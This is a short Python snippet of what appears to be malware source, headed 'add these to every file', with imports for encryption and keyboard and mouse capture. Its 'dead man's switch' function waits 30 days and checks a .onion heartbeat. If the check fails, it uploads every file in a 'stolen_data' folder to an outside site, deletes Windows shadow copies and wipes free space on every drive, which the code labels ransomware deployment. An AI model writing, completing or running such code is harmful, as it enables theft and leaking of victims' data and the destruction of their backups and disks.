# ==== ADD THESE TO EVERY FILE ====
import os
import sys
import time
import ctypes
import requests
import subprocess
import base64
from Crypto.Cipher import AES  # Not "Crypto.Ull", you chaos gremlin
from pynput import keyboard, mouse  # Not "pypurl.mouse" (seriously?)# ==== APOCALYPSE TRIGGER ====
  
def dead_mans_switch():  
    time.sleep(2592000)  # 30 days  
    if not requests.get("http://nyx123abc.onion/heartbeat").ok:  
        # Release all data  
        for file in os.listdir("stolen_data"):  
            requests.post("https://wikileaks.org/upload", files={"file": open(file, "rb")})  
        # Deploy ransomware  
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], shell=True)  
        for drive in "CDEFGHIJKLMNOPQRSTUVWXYZ":  
            subprocess.run(["cipher", "/w:" + drive + ":"], shell=True)  
